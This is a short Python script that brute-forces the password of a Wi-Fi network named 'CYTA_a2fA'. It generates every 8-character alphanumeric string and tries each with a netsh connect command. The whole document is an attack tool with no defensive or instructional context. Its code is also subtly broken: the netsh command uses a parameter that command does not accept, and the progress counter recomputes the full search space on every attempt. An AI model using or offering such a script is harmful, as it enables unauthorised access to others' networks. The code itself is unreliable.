import itertools
import subprocess

def test_password(network, password):
    """Tries to connect to a network using the given password"""
    # Set up the command to connect to the network with the given password
    command = f'netsh wlan connect ssid="{network}" keyMaterial="{password}"'

    # Try to connect to the network with the given password
    connect_output = subprocess.run(command, capture_output=True, text=True)

    # Check if the connection was successful
    if "Connection request was completed successfully." in connect_output.stdout:
        return True
    else:
        return False

# Set the length of the passwords to generate
password_length = 8

# Set the network to target
target_network = "CYTA_a2fA"

# Set the character set to use for generating passwords
character_set = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# Generate all possible passwords of the given length using the given character set
for password in itertools.product(character_set, repeat=password_length):
    # Convert the password tuple to a string
    password_str = ''.join(password)

    # Test the password on the target network
    if test_password(target_network, password_str):
        print(f"Found correct password for network {target_network}: {password_str}")
        break
    else:
        print(f"Incorrect password: {password_str}")

    # Print progress every 10,000 attempts
    if sum(1 for _ in itertools.product(character_set, repeat=password_length)) % 10000 == 0:
        print(f"Attempts so far: {sum(1 for _ in itertools.product(character_set, repeat=password_length))}")
